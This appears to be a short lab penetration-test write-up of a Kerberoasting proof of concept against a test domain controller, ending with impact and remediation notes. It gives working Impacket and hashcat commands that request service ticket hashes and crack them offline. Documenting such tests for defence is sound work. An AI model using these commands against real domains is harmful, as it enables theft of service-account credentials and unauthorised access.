# POC-03 – Kerberoasting

**ATT&CK:** T1558.003 – Steal or Forge Kerberos Tickets: Kerberoasting
**Host:** Kali → Domain Controller
**Tools:** Impacket (`GetUserSPNs.py`), hashcat

## Steps

### 1. Enumerate SPN accounts and request service ticket hashes
```bash
impacket-GetUserSPNs lab.local/domainuser:'Password123' -dc-ip 192.168.56.10 -request
```

### 2. Save the TGS hash and crack offline
```bash
hashcat -m 13100 ticket_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Observation
Record which SPN account's ticket was retrieved (e.g. `svc-sql`) and whether its password cracked.

## Evidence
`![GetUserSPNs output and cracked hash](screenshots/poc03-kerberoast.png)`

## Impact
Any authenticated domain user can request a ticket for a service account; if that account's password is weak, it cracks quickly and yields valid domain credentials — often with elevated local or service rights.

## Remediation
Use long, random passphrases (25+ characters) or Group Managed Service Accounts (gMSA) for all service accounts with an SPN; monitor for abnormal TGS requests.
